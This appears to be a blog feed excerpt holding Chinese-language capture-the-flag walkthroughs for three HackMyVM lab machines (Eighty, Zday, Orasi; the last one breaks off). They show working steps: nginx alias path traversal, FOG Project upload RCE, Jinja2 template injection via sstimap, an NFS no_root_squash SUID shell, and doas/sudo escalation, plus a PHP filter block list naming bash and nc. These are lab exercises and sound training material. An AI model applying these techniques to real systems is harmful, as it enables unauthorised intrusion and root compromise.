/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/eighty/reports/http_192.168.56.8/_24-12-19_22-38-36.txt

Target: http://192.168.56.8/

[22:38:36] Starting:
[22:38:51] 200 -   18B  - /robots.txt

Task Completed

<br>里面有一个 /robots.txt<br>
┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl 192.168.56.8/robots.txt
/nginx_backup.txt

┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl 192.168.56.8/nginx_backup.txt
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
}

server {
server_name henry.eighty.hmv;
root /var/www/html;
index index.html index.htm index.nginx-debian.html;
        location /web {
                alias /home/henry/web/;
        }
  }

server {
server_name susan.eighty.hmv;
root /var/www/html;
index index.html index.htm index.nginx-debian.html;
        location /web {
                alias /home/susan/web/;
        }
  }

<br>可以获取到一个nginx的配置文件<br>
里面发现了两个域名 henry.eighty.hmv  susan.eighty.hmv 还有这两个用户 henry susan<br>
配置到hosts<br>这里还可以获取到两个路径<br>
henry.eighty.hmv/web/<br>
susan.eighty.hmv/web/<br>对这两个路径都进行目录爆破<br>
在susan的目录下可以获取到一个文件<br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# gobuster dir -u  susan.eighty.hmv/web/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,zip,jpg,png,txt,rar
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://susan.eighty.hmv/web/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,png,txt,rar,php,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 40]
/lostpasswd.txt       (Status: 200) [Size: 50]
Progress: 1661144 / 1661152 (100.00%)
===============================================================
Finished
===============================================================

┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl http://susan.eighty.hmv/web/lostpasswd.txt
8ycrois-tu0 + /home/susan/secret/.google-auth.txt


<br><br>这里告诉了我们一个路径 /home/susan/secret/.google-auth.txt<br>
我们可以利用目录穿越读取度这个文件<br>
因为 location /web 写的不规范 正确应该是 location /web/
<br>┌──(root㉿kali)-[~/Desktop/hmv/eighty]
└─# curl http://susan.eighty.hmv/web../secret/.google-auth.txt
2GN7KARBONVR55R7SP3UZPN3ZM
" RATE_LIMIT 3 30
" WINDOW_SIZE 17
" DISALLOW_REUSE
" TOTP_AUTH
71293338
48409754
27074208
60216448
17908010

<br>
这是一段 TOTP（基于时间的一次性密码，Time-Based One-Time Password） 配置文件，通常用于双因素身份验证（2FA）的种子和相关参数<br>
2GN7KARBONVR55R7SP3UZPN3ZM是 TOTP 的密钥种子（Secret Key），通常是一个 Base32 编码的字符串。它用于生成时间敏感的一次性密码
<br>简单来说就是还要输入一次验证码 。这里验证码选择下面任意一个即可<br>
利用密码 8ycrois-tu0 和验证码登录上去<br>
┌──(root㉿kali)-[~]
└─# ssh susan@192.168.112.23
(susan@192.168.112.23) Password:
(susan@192.168.112.23) Verification code:
Linux eighty 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Apr  7 07:05:11 2021
susan@eighty:~$


susan@eighty:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: eighty

PWNED DATE: Thu 19 Dec 2024 11:48:18 PM EST

WHOAMI: uid=1000(susan) gid=1000(susan) groups=1000(susan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hmv8use0red

------------------------

<br><br>susan@eighty:~$ find / -perm -4000 2&gt;/dev/null
/usr/local/bin/doas
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/mount

<br>这里发现了一个 doas<br>
<a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#doas" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#doas</a><br>
有一些替代 sudo 二进制文件的选项，例如 OpenBSD 的 doas，请记得检查其配置文件 /etc/doas.conf。<br>
permit nopass demo as root cmd vim
<br>susan@eighty:~$ find / -name doas.conf 2&gt;/dev/null
/usr/local/etc/doas.conf
susan@eighty:~$ cat /usr/local/etc/doas.conf
permit nolog susan as root cmd gopher
<br>可以发现允许我们使用 root 权限执行 gopher<br>doas -u root gopher
输密码 然后输入！

Spawning your default shell.  Type 'exit' to return to Gopher.

root@eighty:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
root@eighty:/home/susan# whoami
root
root@eighty:/home/susan#


<br>root@eighty:~# sh fl4g.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: eighty

PWNED DATE: Fri Dec 20 00:01:53 EST 2024

WHOAMI: uid=0(root) gid=0(root) groups=0(root)

FLAG: rooted80shmv

------------------------

]]></description><link>https://www.c1trus.top/24-渗透/hmv/42.eighty.html</link><guid isPermaLink="false">24-渗透/HMV/42.eighty.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[41.Zday]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. fog project Rce" data-href="#3. fog project Rce" href="https://www.c1trus.top/about:blank#3._fog_project_Rce" class="internal-link" target="_self" rel="noopener nofollow">3. fog project Rce</a>

<br><a data-tooltip-position="top" aria-label="3.1. ssh绕过限制" data-href="#3.1. ssh绕过限制" href="https://www.c1trus.top/about:blank#3.1._ssh绕过限制" class="internal-link" target="_self" rel="noopener nofollow">3.1. ssh绕过限制</a>


<br><a data-tooltip-position="top" aria-label="4. NFS no_root_squash" data-href="#4. NFS no_root_squash" href="https://www.c1trus.top/about:blank#4._NFS_no_root_squash" class="internal-link" target="_self" rel="noopener nofollow">4. NFS no_root_squash</a>
<br><a data-tooltip-position="top" aria-label="5. bash运行不了怎么办" data-href="#5. bash运行不了怎么办" href="https://www.c1trus.top/about:blank#5._bash运行不了怎么办" class="internal-link" target="_self" rel="noopener nofollow">5. bash运行不了怎么办</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Zday" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Zday</a><br>
作者 sml<br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br><br>
┌──(root㉿kali)-[~/Desktop/hmv/Zday]
└─# nmap 192.168.56.7
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 19:53 EST
Nmap scan report for 192.168.56.7
Host is up (0.00029s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2049/tcp open  nfs
3306/tcp open  mysql
MAC Address: 08:00:27:36:9F:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

<br>首页是 appache<br><br>┌──(root㉿kali)-[~/Desktop/hmv/Zday]
└─# dirsearch -u http://192.168.56.7
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/Zday/reports/http_192.168.56.7/_24-12-19_19-55-54.txt

Target: http://192.168.56.7/


[19:56:05] 302 -    0B  - /index.php  -&gt;  /fog/index.php
[19:56:05] 302 -    0B  - /index.php/login/  -&gt;  /fog/index.php
[19:56:10] 403 -  277B  - /server-status
[19:56:10] 403 -  277B  - /server-status/

<br><br>发现一个fog project的登录框<br>
<img alt="Pasted image 20241219170042" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" referrerpolicy="no-referrer"><br>
利用默认账号密码 fog : password 登录上去<br>看一下版本<br>
<img alt="Pasted image 20241219170255" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170255.png" referrerpolicy="no-referrer"><br>搜索一下相关的漏洞<br>┌──(root㉿kali)-[~/Desktop/hmv/Zday]
└─# searchsploit fog
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Fog Creek Software FogBugz 4.0 29 - 'default.asp' Cross-Site Scripting                                   | asp/webapps/27071.txt
FOG Forum 0.8.1 - Multiple Local File Inclusions                                                         | php/webapps/5784.txt
FOGProject 1.5.9 - File Upload RCE (Authenticated)                                                       | php/webapps/49811.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

<br>成功找到一个满足版本的 文件上传rce<br>尝试利用一下<br><img alt="Pasted image 20241219172007" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219172007.png" referrerpolicy="no-referrer"><br>
参考文章完成利用 <a rel="noopener nofollow" class="external-link" href="https://muzec0318.github.io/posts/articles/fog.html" target="_blank">https://muzec0318.github.io/posts/articles/fog.html</a><br>
但是我卡在了这一步<br>http://192.168.56.7/fog/management/index.php?node=about&amp;sub=kernel&amp;file=aHR0cDovLzE5Mi4xNjguNTYuNi9teXNoZWxsCg==
&amp;arch=arm64
<br>因为它请求不了那个ftp<br><br>在网站后台可以获取到一个账户名与密码<br>
<img alt="Pasted image 20241219174002" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219174002.png" referrerpolicy="no-referrer"><br>利用账户密码SSH上去会发现系统会立马中断我的bash<br>
┌──(root㉿kali)-[~/Desktop/hmv/Zday]
└─# ssh fogproject@192.168.56.7
fogproject@192.168.56.7's password:
Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec 19 04:08:15 2024 from 192.168.56.6
You seem to be using the 'fogproject' system account to logon and work
on your FOG server system.

It's NOT recommended to use this account! Please create a new
account for administrative tasks.

If you re-run the installer it would reset the 'fog' account
password and therefore lock you out of the system!

Take care,
your FOGproject team
Connection to 192.168.56.7 closed.

<br>这里我们利用 ssh fogproject@192.168.56.7 -t sh 进行绕过<br>
也是一个属于 <a data-tooltip-position="top" aria-label="../渗透姿势库/rbash绕过" data-href="../渗透姿势库/rbash绕过" href="https://www.c1trus.top/24-渗透/渗透姿势库/rbash绕过.html" class="internal-link" target="_self" rel="noopener nofollow">rbash绕过</a>的方式<br>
┌──(root㉿kali)-[~/Desktop/hmv/Zday]
└─# ssh fogproject@192.168.56.7 -t sh
fogproject@192.168.56.7's password:
$ whoami
fogproject
$ id
uid=1001(fogproject) gid=1001(fogproject) groups=1001(fogproject)
$
<br><br>使用脚本检测出来NFS共享里面启用了 no_root_squash<br>╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts:
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
-rw-r--r-- 1 root root 174 Mar 10  2021 /etc/exports
/images *(ro,sync,no_wdelay,no_subtree_check,insecure_locks,no_root_squash,insecure,fsid=0)
/images/dev *(rw,async,no_wdelay,no_subtree_check,no_root_squash,insecure,fsid=1)

其中 /images/dev 目录我们具有读写权限
<br>参考利用 <a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a><br>
<img alt="Pasted image 20241219175540" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219175540.png" referrerpolicy="no-referrer"><br>#Attacker, as root user
mkdir /tmp/pe
mount -t nfs &lt;IP&gt;:&lt;SHARED_FOLDER&gt; /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd &lt;SHAREDD_FOLDER&gt;
./bash -p #ROOT shell
<br><br>安装hacktrick 上面利用可能会出现bash在靶机上运行不了<br>
报错<br>$ ./bash -p
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.36' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by ./bash)
./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./bash)

<br>这是由于版本不对<br>
我们重新编译一个传过去即可<br>到 <a rel="noopener nofollow" class="external-link" href="https://ftp.gnu.org/gnu/bash/" target="_blank">https://ftp.gnu.org/gnu/bash/</a> 下载一个时间差不多的版本。这里靶机是21年的我就下一个21年的bash<br>
<img alt="Pasted image 20241219182432" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219182432.png" referrerpolicy="no-referrer"><br>攻击机
tar -zxvf bash-5.1.8.tar.gz
./configure --enable-static-link --without-bash-malloc
make
cp bash /tmp/pe
chmod +s /tmp/pe/bash

受害机
./bash -p
<br>bash-5.1# cat /root/root.txt
ihavebeenherealways

bash-5.1# cat /home/estas/user.txt
whereihavebeen

]]></description><link>https://www.c1trus.top/24-渗透/hmv/41.zday.html</link><guid isPermaLink="false">24-渗透/HMV/41.Zday.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[40.orasi]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 网站探测" data-href="#2.2. 网站探测" href="https://www.c1trus.top/about:blank#2.2._网站探测" class="internal-link" target="_self" rel="noopener nofollow">2.2. 网站探测</a>
<br><a data-tooltip-position="top" aria-label="2.3. 目录扫描" data-href="#2.3. 目录扫描" href="https://www.c1trus.top/about:blank#2.3._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.3. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.4. ftp匿名登录" data-href="#2.4. ftp匿名登录" href="https://www.c1trus.top/about:blank#2.4._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">2.4. ftp匿名登录</a>
<br><a data-tooltip-position="top" aria-label="2.5. 文件分析" data-href="#2.5. 文件分析" href="https://www.c1trus.top/about:blank#2.5._文件分析" class="internal-link" target="_self" rel="noopener nofollow">2.5. 文件分析</a>


<br><a data-tooltip-position="top" aria-label="3. flask/jinja2 模版注入" data-href="#3. flask/jinja2 模版注入" href="https://www.c1trus.top/about:blank#3._flask/jinja2_模版注入" class="internal-link" target="_self" rel="noopener nofollow">3. flask/jinja2 模版注入</a>

<br><a data-tooltip-position="top" aria-label="3.1. 参数爆破" data-href="#3.1. 参数爆破" href="https://www.c1trus.top/about:blank#3.1._参数爆破" class="internal-link" target="_self" rel="noopener nofollow">3.1. 参数爆破</a>
<br><a data-tooltip-position="top" aria-label="3.2. 工具利用" data-href="#3.2. 工具利用" href="https://www.c1trus.top/about:blank#3.2._工具利用" class="internal-link" target="_self" rel="noopener nofollow">3.2. 工具利用</a>
<br><a data-tooltip-position="top" aria-label="3.3. 反弹shell" data-href="#3.3. 反弹shell" href="https://www.c1trus.top/about:blank#3.3._反弹shell" class="internal-link" target="_self" rel="noopener nofollow">3.3. 反弹shell</a>


<br><a data-tooltip-position="top" aria-label="4. www-data提权用户kori" data-href="#4. www-data提权用户kori" href="https://www.c1trus.top/about:blank#4._www-data提权用户kori" class="internal-link" target="_self" rel="noopener nofollow">4. www-data提权用户kori</a>
<br><a data-tooltip-position="top" aria-label="5. kori用户提权irida用户" data-href="#5. kori用户提权irida用户" href="https://www.c1trus.top/about:blank#5._kori用户提权irida用户" class="internal-link" target="_self" rel="noopener nofollow">5. kori用户提权irida用户</a>
<br><a data-tooltip-position="top" aria-label="6. irida用户提权root" data-href="#6. irida用户提权root" href="https://www.c1trus.top/about:blank#6._irida用户提权root" class="internal-link" target="_self" rel="noopener nofollow">6. irida用户提权root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Orasi" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Orasi</a><br>
作者 alienum<br>
难度 ⭐️⭐️⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[~]
└─# nmap -sCV 192.168.212.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 11:57 CST
Nmap scan report for bbr.thl (192.168.212.4)
Host is up (0.00058s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.212.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8a:07:93:8e:8a:d6:67:fe:d0:10:88:14:61:49:5a:66 (RSA)
|   256 5a:cd:25:31:ec:f2:02:a8:a8:ec:32:c9:63:89:b2:e3 (ECDSA)
|_  256 39:70:57:cc:bb:9b:65:50:36:8d:71:00:a2:ac:24:36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn''t have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.7.3
|_http-title: 404 Not Found
MAC Address: 08:00:27:4B:94:89 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds

┌──(root㉿kali)-[~]
└─# nmap 192.168.212.4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 11:58 CST
Nmap scan report for bbr.thl (192.168.212.4)
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 08:00:27:4B:94:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds

<br><br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# curl http://192.168.212.4
&lt;head&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Orasi&lt;/h1&gt;
&lt;br&gt;
&lt;p&gt;6 6 1337leet&lt;/p&gt;
&lt;/body&gt;

<br>获取到一个提示<br>
6 6 1337leet<br><br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# dirsearch -u http://192.168.212.4
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/orasi/reports/http_192.168.212.4/_24-12-06_12-07-54.txt

Target: http://192.168.212.4/

[12:07:54] Starting:

Task Completed


<br>没有什么东西<br><br>可以获取到一个ELF类型的文件<br>ftp&gt; ls -a
229 Entering Extended Passive Mode (|||45415|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
-rw-r--r--    1 ftp      ftp         16976 Feb 07  2021 url

┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# file url
url: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped
<br><br>现在应该是要从这个文件开始入手了<br>
对Url文件进行逆向分析<br>
这个看起来就像是一个路径<br>
<img alt="Pasted image 20241206121115" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" referrerpolicy="no-referrer"><br>
将其凭借起来<br>
/sh4d0w$s<br>
尝试访问 <br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# curl http://192.168.212.4//sh4d0w$s
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;

<br>看来不是的<br>还有一个5000端口<br>
<img alt="Pasted image 20241206122151" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206122151.png" referrerpolicy="no-referrer"><br>
这里提示我们需要一个参数<br>
查看Server可以发现是一个flask框架，那很可能就是一个模版注入了<br><br><img alt="Pasted image 20240408231714" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020240408231714.png" referrerpolicy="no-referrer"><br>
从上图我们可以看出 jinja2 模版端口是5000<br>
那这个靶机的多半也是jinja2的模版<br>但是要注入那我们肯定是需要一个参数的<br><br>这个参数可以尝试爆破<br>
试了一下常用的几个字典没有爆破出来<br>我想到了之前网站首页给我们的一个提示 6 6 1337leet<br>
这看着像是一个crunsh生成字典的参数<br>
尝试用这个生成字典<br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# crunch 6 6 leet1337 &gt; wordlist.txt
Crunch will now generate the following amount of data: 326592 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 46656

<br>然后进行爆破<br>┌──(root㉿kali)-[/home/kali/hmv/orasi]
└─# ffuf -u 'http://192.168.212.4:5000/sh4d0w$s?FUZZ=1' -w wordlist.txt |grep -v 'Size: 8'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.212.4:5000/sh4d0w$s?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/hmv/orasi/wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

l333tt                  [Status: 200, Size: 1, Words: 1, Lines: 1, Duration: 132ms]

<br>成功爆破出参数为 l333tt<br>验证一下<br>http://192.168.212.4:5000/sh4d0w$s?l333tt={{2*2}}
<br><img alt="Pasted image 20241206125012" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206125012.png" referrerpolicy="no-referrer"><br>
使用 {{%s}} 解析成功 ，可以判断是 jinja2 的模版<br><br>这里我们应该没有过滤我们直接用工具<a data-tooltip-position="top" aria-label="../../26-工具使用/SSTIMAP使用" data-href="../../26-工具使用/SSTIMAP使用" href="https://www.c1trus.top/26-工具使用/sstimap使用.html" class="internal-link" target="_self" rel="noopener nofollow">SSTIMAP</a>进行利用<br>
-u 进行检测<br>python sstimap.py -u http://192.168.212.4:5000/sh4d0w$s?l333tt=1
<br><img alt="Pasted image 20241206125635" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206125635.png" referrerpolicy="no-referrer"><br>
成功检测出ssti模版注入。也检测出模版是 Jinja2<br>--os-shell 获取shell<br>python sstimap.py -u http://192.168.212.4:5000/sh4d0w$s?l333tt=1 --os-shell
[+] Run commands on the operating system.
posix-linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<br>下一步吧shell弹过来即可<br><br><img alt="Pasted image 20241206130042" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206130042.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@orasi:/tmp$ sudo -l
Matching Defaults entries for www-data on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on orasi:
    (kori) NOPASSWD: /bin/php /home/kori/jail.php *

(remote) www-data@orasi:/tmp$ cat /home/kori/jail.php
&lt;?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("Orasis Jail, argument missing\n");

function filter($var) {
        if(preg_match('/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        $result = exec($var);
        echo "$result\n";
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?&gt;

<br>jail.php 这里存在一个命令执行。虽然过滤了很多命令。但是我们还可以用启动python<br>
然后用python进行反弹<br>(remote) www-data@orasi:/var/www/html$ sudo -u kori /bin/php /home/kori/jail.php python
Python 2.7.16 (default, Oct 10 2019, 22:02:15)
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
